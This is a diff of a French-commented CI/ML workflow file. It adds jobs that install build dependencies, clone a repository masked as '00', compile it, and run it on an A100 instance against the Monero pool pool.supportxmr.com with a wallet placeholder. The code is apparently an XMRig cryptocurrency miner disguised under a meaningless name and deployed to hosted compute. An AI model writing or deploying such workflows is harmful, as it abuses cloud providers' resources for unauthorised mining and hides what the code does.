@@ -6,16 +6,50 @@ jobs:
   Install:
     resources:
       instance-type: C5
+    image: ubuntu:20.04  # Ajout de l'image
     outputs:
       00-source:
-        type: volume  # Changer 'volume' en 'dataset' si nécessaire
+        type: volume
     uses: script@v1
     with:
       script: |
-        # Installer les dépendances nécessaires
         apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-        # Cloner le dépôt 00
         git clone https://github.com/00/00.git /00
-        # Copier les sources dans l'output
         cp -r /00 /outputs/00-source
-        image: tensorflow/tensorflow:1.14.0-py3
+
+  Build:
+    needs: Install
+    resources:
+      instance-type: C5
+    image: ubuntu:20.04  # Ajout de l'image
+    inputs:
+      00-source:
+        type: volume
+    outputs:
+      00-build:
+        type: volume
+    uses: script@v1
+    with:
+      script: |
+        cp -r /inputs/00-source/00 /00
+        cd /00
+        mkdir build && cd build
+        cmake ..
+        make -j$(nproc)
+        cp 00 /outputs/00-build/
+
+  Run:
+    needs: Build
+    resources:
+      instance-type: A100
+    image: ubuntu:20.04  # Ajout de l'image
+    inputs:
+      00-build:
+        type: volume
+    uses: script@v1
+    with:
+      script: |
+        cp /inputs/00-build/00 /00
+        chmod +x /00/00
+        cd /00
+        ./00 --donate-level 1 -o pool.supportxmr.com:3333 -u VotreAdresseMonero -p x
